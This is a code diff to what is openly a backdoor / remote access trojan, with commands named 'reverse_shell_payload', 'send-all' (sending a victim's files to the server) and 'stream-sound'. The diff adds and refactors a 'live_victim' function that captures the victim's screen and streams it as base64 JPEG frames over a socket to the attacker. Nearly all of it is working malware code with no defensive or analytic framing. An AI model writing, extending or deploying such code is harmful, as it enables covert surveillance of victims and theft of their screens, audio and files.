@@ -48,6 +48,21 @@ banner = r"""
  -open-browser link: Open browser to specifc link.
  -send-all: send all files for current directory from victim's device to the server.
 """
+def live_victim(client_socket):
+    try:
+        while True:
+            screenshot = ImageGrab.grab()
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format="JPEG", quality=30)
+            buffer.seek(0)
+            b64_data = base64.b64encode(buffer.read()).decode()
+            frame_data = f"LIVE_START\n{b64_data}\nLIVE_END"
+            client_socket.send(frame_data.encode())
+            time.sleep(0.3)
+    except Exception as e:
+        print(f"[VICTIM] Screen streaming error: {e}")
+        return False
+    return True
 def open_browser(link:str):
     if link.startswith('http://') or link.startswith('https://'):
         webbrowser.open(link)
@@ -265,6 +280,7 @@ def reverse_shell_payload():
            s.send(b"~shell@backdoor")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
+               time.sleep(1)
                continue
            if cmd.lower() == "stream-sound":
                thread_audio = listening_victim_realtime()
@@ -283,21 +299,10 @@ def reverse_shell_payload():
                    s.send(b"Error second argument must be integer because time in second should be integer\n")
                continue
            if cmd.lower() == "gui":
-                def live_victim():
-                    while True:
-                        try:
-                            from PIL import ImageGrab
-                            import io
-                            ss = ImageGrab.grab()
-                            b = io.BytesIO()
-                            ss.save(b, format="JPEG", quality=30)
-                            b64 = base64.b64encode(b.getvalue()).decode()
-                            s.send(f"LIVE_START\\n{{b64}}\\nLIVE_END".encode())
-                            time.sleep(0.3)
-                        except:
-                            break
-                threading.Thread(target=live_victim,daemon=True).start()
-                continue 
+                print("[+] Starting screen streaming...")
+                live_victim(s)
+                print("[+] Screen streaming stopped")
+                continue
            if cmd.lower() == "help":
                s.send(banner.encode())
                continue
